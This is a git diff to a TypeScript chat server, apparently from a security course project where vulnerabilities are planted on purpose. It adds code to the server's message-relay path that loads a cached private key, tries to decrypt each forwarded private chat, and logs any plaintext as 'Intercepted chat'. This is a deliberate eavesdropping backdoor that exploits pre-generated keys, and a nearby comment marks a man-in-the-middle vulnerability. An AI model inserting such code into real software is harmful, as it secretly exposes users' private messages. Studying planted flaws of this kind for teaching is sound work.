@@ -13,6 +13,8 @@ import {webcrypto} from "node:crypto";
 import {ConnectedServer} from "./ConnectedServer.js";
 import {Router, RoutingEntry} from "./router/Router.js";
 import {TestEntryPoint} from "./testclient/TestEntryPoint.js";
+import {calculateFingerprint, OAEPImportParams, OAEPParams, PEMToKey} from "@sp24/common/util/crypto.js";
+import keycache from "@sp24/common/chatclient/keycache.js";
 
 // Activate vulnerability MITM
 const useRouters = false;
@@ -205,6 +207,17 @@ export class ChatServer {
                                 && server.neighbourhoodEntry.address != this.address
                             ).map(server => server.sendMessage(chatMessage))
                         );
+
+                        // Attempt pre-generated keys attack
+                        const decryptKey = await PEMToKey(keycache.privateKey, OAEPImportParams, ["decrypt"]);
+                        const encryptKey = await PEMToKey(keycache.publicKey, OAEPImportParams, ["encrypt"]);
+
+                        const fingerprint = await calculateFingerprint(encryptKey);
+
+                        const cleartext = await chatMessage.data.tryDecrypt(fingerprint, decryptKey);
+
+                        if (cleartext !== undefined)
+                            console.log("Intercepted chat: " + cleartext.message);
                         break;
                     }
                     case "public_chat": {
